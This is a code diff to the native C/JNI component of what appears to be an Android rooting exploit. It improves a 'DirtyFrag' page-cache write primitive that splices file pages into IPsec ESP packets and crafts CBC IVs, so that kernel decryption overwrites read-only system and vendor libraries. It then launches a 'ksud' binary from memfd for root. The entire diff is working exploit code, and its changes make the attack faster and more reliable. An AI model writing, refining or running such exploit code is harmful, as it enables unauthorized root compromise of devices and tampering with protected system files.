@@ -14,11 +14,16 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
+#include <time.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <jni.h>
 #include "aes256.h"
 #include "hmac_sha256.h"
+
+#ifndef MFD_CLOEXEC
+#define MFD_CLOEXEC 0x0001U
+#endif
 
 static jmethodID report_mid;
 
@@ -74,6 +79,22 @@ static uint8_t  g_hmac_key[32];
 static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
 
+struct Metrics {
+    unsigned long helper_execs;
+    unsigned long pipes;
+    unsigned long packets;
+    unsigned long bytes_patched;
+    uint64_t started_ms;
+};
+
+static struct Metrics g_metrics;
+
+static uint64_t monotonic_ms(void) {
+    struct timespec ts;
+    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
+    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
+}
+
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
  *   = AES_DEC(key, old_content) XOR IV
@@ -87,145 +108,191 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
         iv[i] = dec[i] ^ desired[i];
 }
 
-/* Read up to len bytes from the vendor file at offset through the crash_dump
- * bridge (splicehelper "rb" mode). One helper exec per chunk instead of one
- * per 16-byte block: the .ko patch drops from ~1000 forks to a handful.
+/* Run the patched crash_dump64 helper once and return its stdout pipe.
+ * The helper writes up to one 4 KB page of data, so the parent can safely
+ * wait for it before draining the pipe.
  */
-static int read_vendor_chunk(off_t offset, uint8_t *buf, size_t len,
-                             struct Reporter *reporter) {
-    size_t want = len > 4096 ? 4096 : len;
-    int rdpipe[2];
-    if (pipe(rdpipe) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
+static int run_vendor_helper(off_t offset, const char *mode, size_t len,
+                             int *out_fd, struct Reporter *reporter) {
+    int p[2];
+    *out_fd = -1;
+    if (pipe(p) < 0) {
+        REPORTLN("pipe failed: %s", strerror(errno));
+        return -1;
+    }
+    g_metrics.pipes++;
+    fcntl(p[1], F_SETPIPE_SZ, 65536);
 
-    char offstr[24];
+    char offstr[24], lenstr[24];
     snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+    snprintf(lenstr, sizeof(lenstr), "%zu", len);
 
     int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
     if (pid < 0) {
         REPORTLN("vfork failed: %s", strerror(errno));
-        close(rdpipe[0]); close(rdpipe[1]);
+        close(p[0]); close(p[1]);
         return -1;
     }
     if (pid == 0) {
-        close(rdpipe[0]);
-        if (rdpipe[1] != 0) {
-            if (dup2(rdpipe[1], 0) < 0) _exit(1);
-            close(rdpipe[1]);
+        close(p[0]);
+        if (p[1] != 1) {
+            if (dup2(p[1], 1) < 0) _exit(1);
+            close(p[1]);
         }
-        execl(kCrashDump, "crashdump64", offstr, target_lib_path, "rb", NULL);
+        execl(kCrashDump, "crashdump64", offstr, target_lib_path, mode, lenstr, NULL);
         _exit(1);
     }
-    close(rdpipe[1]);
-    int status;
-    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
-    size_t got = 0;
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-        while (got < want) {
-            ssize_t n = TEMP_FAILURE_RETRY(read(rdpipe[0], buf + got, want - got));
-            if (n <= 0) break;
-            got += (size_t)n;
-        }
-    }
-    close(rdpipe[0]);
-    if (got != want) {
-        if (WIFEXITED(status))
-            REPORTLN("read_vendor at 0x%lx got %zu/%zu (exit %d)",
-                     (long)offset, got, want, WEXITSTATUS(status));
-        else if (WIFSIGNALED(status))
-            REPORTLN("read_vendor at 0x%lx got %zu/%zu (signal %d)",
-                     (long)offset, got, want, WTERMSIG(status));
-        else
-            REPORTLN("read_vendor at 0x%lx got %zu/%zu (status 0x%x)",
-                     (long)offset, got, want, status);
+    close(p[1]);
+    g_metrics.helper_execs++;
+
+    int status = 0;
+    pid_t waited = TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
+    if (waited < 0) {
+        REPORTLN("helper waitpid failed: %s", strerror(errno));
+        close(p[0]);
         return -1;
     }
+    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+        if (WIFEXITED(status))
+            REPORTLN("helper at 0x%lx %s/%zu exit %d", (long)offset, mode, len,
+                     WEXITSTATUS(status));
+        else if (WIFSIGNALED(status))
+            REPORTLN("helper at 0x%lx %s/%zu signal %d", (long)offset, mode, len,
+                     WTERMSIG(status));
+        else
+            REPORTLN("helper at 0x%lx %s/%zu status 0x%x", (long)offset, mode, len, status);
+        close(p[0]);
+        return -1;
+    }
+    *out_fd = p[0];
     return 0;
 }
 
-/* Send one CBC write on the already-connected sender socket.
- * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
- * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
- * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
+static int read_exact(int fd, uint8_t *buf, size_t len) {
+    size_t got = 0;
+    while (got < len) {
+        ssize_t n = TEMP_FAILURE_RETRY(read(fd, buf + got, len - got));
+        if (n <= 0) break;
+        got += (size_t)n;
+    }
+    return got == len ? 0 : -1;
+}
+
+/* Read a vendor-file chunk without consuming its page-cache references. */
+static int read_vendor_chunk(off_t offset, uint8_t *buf, size_t len,
+                             struct Reporter *reporter) {
+    size_t want = len > 4096 ? 4096 : len;
+    int fd = -1;
+    if (run_vendor_helper(offset, "rb", want, &fd, reporter) != 0) return -1;
+    int ret = read_exact(fd, buf, want);
+    close(fd);
+    if (ret != 0) REPORTLN("read_vendor at 0x%lx short read (%zu)", (long)offset, want);
+    return ret;
+}
+
+/* Put a 4 KB vendor chunk into a pipe as page-cache references. The patcher
+ * consumes 16 bytes per ESP packet instead of forking the helper per block.
  */
-static int do_one_write_cbc(int file_fd, off_t offset,
-                            const uint8_t iv[16], const uint8_t old_content[16],
-                            int use_helper, struct Reporter *reporter) {
+static int bulk_splice_vendor(off_t offset, size_t len, int *src_fd,
+                              struct Reporter *reporter) {
+    return run_vendor_helper(offset, "sb", len, src_fd, reporter);
+}
+
+/* ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
+ * Ciphertext is taken from src_fd, a pipe holding page-cache references for
+ * one chunk. The pipe-to-pipe splice moves the page reference, not a copy;
+ * that shared-frag property is what the DirtyFrag primitive requires. One
+ * datagram pipe is reused for every block in the chunk.
+ */
+static int send_one_cbc_from_pipe(int src_fd, int pfd[2], off_t offset,
+                                  const uint8_t iv[16], const uint8_t old_content[16],
+                                  struct Reporter *reporter) {
     int ret = -1;
-
-    int pfd[2];
-    if (pipe(pfd) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
-    fcntl(pfd[1], F_SETPIPE_SZ, 65536);
-
-    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
     uint32_t seq = g_seq++;
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(seq);
     memcpy(hdr + 8, iv, 16);
 
-    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
     uint8_t hmac_msg[40];
-    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
-    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
-    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
+    memcpy(hmac_msg,      hdr,         8);
+    memcpy(hmac_msg + 8,  iv,          16);
+    memcpy(hmac_msg + 24, old_content, 16);
     uint8_t hmac_full[32];
     hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);
 
-    /* vmsplice header + IV (24 bytes). No SPLICE_F_GIFT: these are stack
-     * buffers and GIFT hands the page to the kernel permanently. */
     struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
     if (vmsplice(pfd[1], &iov1, 1, 0) != 24) {
-        REPORTLN("vmsplice hdr failed: %s", strerror(errno)); goto out_pipe;
+        REPORTLN("vmsplice hdr failed: %s", strerror(errno));
+        return -1;
     }
 
-    /* splice ciphertext from file (16 bytes, page-cache reference) */
-    if (use_helper) {
-        char offstr[24];
-        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
-        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
-        if (pid < 0) { REPORTLN("vfork failed: %s", strerror(errno)); goto out_pipe; }
-        if (pid == 0) {
-            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
-            execl(kCrashDump, "crashdump64", offstr, target_lib_path, NULL);
-            _exit(1);
-        }
-        int st;
-        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
-        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
-            REPORTLN("splice helper failed status=0x%x", st);
-            goto out_pipe;
-        }
-    } else {
-        off_t off = offset;
-        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
-            REPORTLN("splice file failed: %s", strerror(errno)); goto out_pipe;
-        }
+    if (splice(src_fd, NULL, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
+        REPORTLN("splice ciphertext at 0x%lx failed: %s", (long)offset, strerror(errno));
+        return -1;
     }
 
-    /* vmsplice ICV (truncated HMAC) */
     struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
     if (vmsplice(pfd[1], &iov2, 1, 0) != g_icv_len) {
-        REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
+        REPORTLN("vmsplice ICV failed: %s", strerror(errno));
+        return -1;
     }
 
-    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
-    {
-        int total = 24 + 16 + g_icv_len;
-        ssize_t s = splice(pfd[0], NULL, g_sender_fd, NULL, total, 0);
-        ret = (s == total) ? 0 : -1;
-        if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
+    int total = 24 + 16 + g_icv_len;
+    ssize_t s = splice(pfd[0], NULL, g_sender_fd, NULL, total, 0);
+    ret = (s == total) ? 0 : -1;
+    if (ret) {
+        REPORTLN("splice pipe->udp at 0x%lx: %zd expected %d",
+                 (long)offset, s, total);
+    } else {
+        g_metrics.packets++;
     }
-
-out_pipe:
-    close(pfd[0]); close(pfd[1]);
     return ret;
 }
 
+/* Prepare one chunk: copy the old plaintext for IV/HMAC, then keep a second
+ * set of page-cache references in a pipe for the ESP ciphertext fields.
+ */
+static int prepare_chunk(int file_fd, off_t offset, uint8_t *old_buf, size_t n,
+                         int use_helper, int *src_fd, struct Reporter *reporter) {
+    *src_fd = -1;
+    if (use_helper) {
+        if (read_vendor_chunk(offset, old_buf, n, reporter) != 0) return -1;
+        return bulk_splice_vendor(offset, n, src_fd, reporter);
+    }
+
+    if (pread(file_fd, old_buf, n, offset) != (ssize_t)n) {
+        REPORTLN("pread at 0x%lx failed: %s", (long)offset, strerror(errno));
+        return -1;
+    }
+
+    int p[2];
+    if (pipe(p) < 0) {
+        REPORTLN("pipe failed: %s", strerror(errno));
+        return -1;
+    }
+    g_metrics.pipes++;
+    fcntl(p[1], F_SETPIPE_SZ, 65536);
+    off_t off = offset;
+    size_t moved = 0;
+    while (moved < n) {
+        ssize_t s = splice(file_fd, &off, p[1], NULL, n - moved, SPLICE_F_MOVE);
+        if (s <= 0) {
+            REPORTLN("splice file at 0x%lx failed: %s", (long)offset, strerror(errno));
+            close(p[0]); close(p[1]);
+            return -1;
+        }
+        moved += (size_t)s;
+    }
+    close(p[1]);
+    *src_fd = p[0];
+    return 0;
+}
+
 /* Patch len bytes of payload into file starting at file offset foff.
- * Writes in 16-byte CBC blocks, in 4 KB chunks: the old content is read per
- * chunk (one helper exec for vendor files), written, read back and compared.
- * A mismatch retries the chunk once before failing. len must be a multiple
- * of 16.
+ * Each chunk keeps one pipe of page-cache references, so a vendor patch pays
+ * one helper exec for the source pipe plus one for verification, not one per
+ * 16-byte block. A mismatch retries the chunk once before failing.
  */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
                            size_t foff, int use_helper, struct Reporter *reporter) {
@@ -254,16 +321,22 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
         int chunk_ok = 0;
         for (int attempt = 1; attempt <= 2 && !chunk_ok; attempt++) {
-            if (use_helper) {
-                if (read_vendor_chunk((off_t)(foff + base), old_buf, n, reporter) < 0) {
-                    rc = -1;
-                    break;
-                }
-            } else if (pread(file_fd, old_buf, n, (off_t)(foff + base)) != (ssize_t)n) {
-                REPORTLN("pread at 0x%lx failed: %s", (long)(foff + base), strerror(errno));
+            int src_fd = -1;
+            if (prepare_chunk(file_fd, (off_t)(foff + base), old_buf, n,
+                              use_helper, &src_fd, reporter) != 0) {
                 rc = -1;
                 break;
             }
+
+            int pfd[2];
+            if (pipe(pfd) < 0) {
+                REPORTLN("pipe failed: %s", strerror(errno));
+                close(src_fd);
+                rc = -1;
+                break;
+            }
+            g_metrics.pipes++;
+            fcntl(pfd[1], F_SETPIPE_SZ, 65536);
 
             int write_ok = 1;
             for (size_t i = 0; i < n; i += 16) {
@@ -271,17 +344,20 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
                 memcpy(desired, payload + base + i, 16);
                 uint8_t iv[16];
                 compute_iv(old_buf + i, desired, iv);
-                if (do_one_write_cbc(file_fd, (off_t)(foff + base + i),
-                                     iv, old_buf + i, use_helper, reporter) < 0) {
+                if (send_one_cbc_from_pipe(src_fd, pfd, (off_t)(foff + base + i),
+                                           iv, old_buf + i, reporter) < 0) {
                     REPORTLN("write at 0x%lx failed", (long)(foff + base + i));
                     write_ok = 0;
                     break;
                 }
             }
+            close(pfd[0]); close(pfd[1]);
+            close(src_fd);
             if (!write_ok) {
                 rc = -1;
                 break;
             }
+            g_metrics.bytes_patched += n;
 
             if (use_helper) {
                 if (read_vendor_chunk((off_t)(foff + base), verify_buf, n, reporter) < 0) {
@@ -615,15 +691,23 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
             || hmacKey == NULL || jksudPath == NULL) {
         return 3;
     }
-    if ((*env)->GetArrayLength(env, aesCbcKey) < 32
-            || (*env)->GetArrayLength(env, hmacKey) < 32) {
+    if ((*env)->GetArrayLength(env, aesCbcKey) != 32
+            || (*env)->GetArrayLength(env, hmacKey) != 32) {
         return 3;
     }
-    if (senderFd < 0) {
+    if (senderFd < 0 || icvLen != 16 || encapPort <= 0 || encapPort > 65535) {
+        return 3;
+    }
+    int sock_type = 0;
+    socklen_t sock_type_len = sizeof(sock_type);
+    if (getsockopt((int)senderFd, SOL_SOCKET, SO_TYPE, &sock_type, &sock_type_len) != 0
+            || sock_type != SOCK_DGRAM) {
         return 3;
     }
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
+    memset(&g_metrics, 0, sizeof(g_metrics));
+    g_metrics.started_ms = monotonic_ms();
     g_encap_port = (int)encapPort;
     g_sender_fd  = (int)senderFd;
     g_spi        = (uint32_t)spi;
@@ -664,6 +748,12 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
             REPORTLN("ksud path unavailable");
             return 3;
         }
+        size_t ksud_path_len = strlen(ksud_path);
+        if (ksud_path_len == 0 || ksud_path_len > 4096) {
+            REPORTLN("ksud path length invalid: %zu", ksud_path_len);
+            (*env)->ReleaseStringUTFChars(env, jksudPath, ksud_path);
+            return 3;
+        }
         int src = open(ksud_path, O_RDONLY | O_CLOEXEC);
         (*env)->ReleaseStringUTFChars(env, jksudPath, ksud_path);
         if (src < 0) {
@@ -677,7 +767,7 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
             return 3;
         }
         REPORTLN("ksud: %lld bytes", (long long)st.st_size);
-        ksud_mfd = (int)syscall(__NR_memfd_create, "ksud", 0);
+        ksud_mfd = (int)syscall(__NR_memfd_create, "ksud", MFD_CLOEXEC);
         if (ksud_mfd < 0) {
             REPORTLN("memfd_create failed: %s", strerror(errno));
             close(src);
@@ -760,15 +850,8 @@ Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused))
                     goto done;
                 }
                 if (strcmp(markers[j].path, "/dev/dfm5") == 0) {
-                    // fork succeeded — poll 300ms for execve failure
-                    for (int w = 0; w < 1000; w += 10) {
-                        usleep(10000);
-                        if (has_marker("/dev/dfm6")) {
-                            REPORTLN("***FAILED***: ksud exited with error");
-                            rc = 1;
-                            goto done;
-                        }
-                    }
+                    // Stage 2 creates this only after the exec status pipe
+                    // reaches EOF, so exec failure is already excluded.
                     REPORTLN("***SUCCESS***");
                     rc = 0;
                     goto done;
@@ -786,5 +869,9 @@ done:
     free(libcxx_r.shell_orig);
     free(libc_r.shell_orig);
     if (ksud_mfd >= 0) close(ksud_mfd);
+    uint64_t elapsed_ms = monotonic_ms() - g_metrics.started_ms;
+    REPORTLN("metrics: helper=%lu pipes=%lu packets=%lu bytes=%lu elapsed=%llums",
+             g_metrics.helper_execs, g_metrics.pipes, g_metrics.packets,
+             g_metrics.bytes_patched, (unsigned long long)elapsed_ms);
     return rc;
 }
